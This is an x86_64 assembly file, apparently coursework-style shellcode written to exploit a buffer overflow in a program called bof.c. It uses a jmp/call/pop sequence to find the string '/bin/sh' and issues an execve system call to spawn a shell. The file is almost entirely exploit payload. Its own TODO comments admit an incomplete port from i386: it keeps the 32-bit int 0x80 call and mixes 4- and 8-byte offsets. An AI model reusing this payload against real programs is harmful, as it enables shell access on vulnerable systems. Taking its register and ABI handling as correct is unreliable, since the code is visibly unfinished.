
; This is for bof.c
; It is the x86_64 version of testya5.asm from the i386 notes
; It is modeled after un1k0d3r's code in the paper.
; This shell code is ?? bytes in length
; John F. Davis davisjf@gmail.com

;;;;;; Above this line is part of our model for how we get to our
;;;;;; function pointer to call based upon ascii variable decoded in read buffer.
; create a label so we know where to start looking when
; we write the patch file.
	jmp theCall

; Release the kracken
theKracken:
	pop rdi

; This is our goal - TODO: adjust for x86_64
; (gdb) print /x $eax
; $3 = 0xb                       system call number
; (gdb) print /x $ebx
; $4 = 0xbffff374                pointer to string
; (gdb) print /x $ecx
; $5 = 0xbffff37c                pointer to pointer to string
; (gdb) print /x $edx
; $6 = 0x0						 null pointer
; (gdb) x/4w 0xbffff374
; 0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000


; TODO: just changed reg names around.  need to use x86_64 ABI

; Prepare execv parms in the regs per abi
; Load the string pointers for parm 1 and 2
	mov rbx, rsp  ; ebx is a pointer to string
	add rsp, 8		; point to next word
	mov [rsp], rbx	; put pointer in the word
	mov rcx, rsp  ; ecx is a pointer to a pointer to string
; Add code to create null pointer for exec syscall
	mov    rax, rcx ; edx will point to next location
	add    rax, 4
	xor    rdx, rdx
	mov    [rax], rdx ; now edx points to a zero word
; Load the execv system call
	xor rax, rax ; eax is zero again
	mov rdx, rax
	add rax, 0xb ; now its the execv syscall
; Do a system call
	int 0x80
	


theCall:
	call theKracken

execvCmdString: db '/bin/sh',0x0

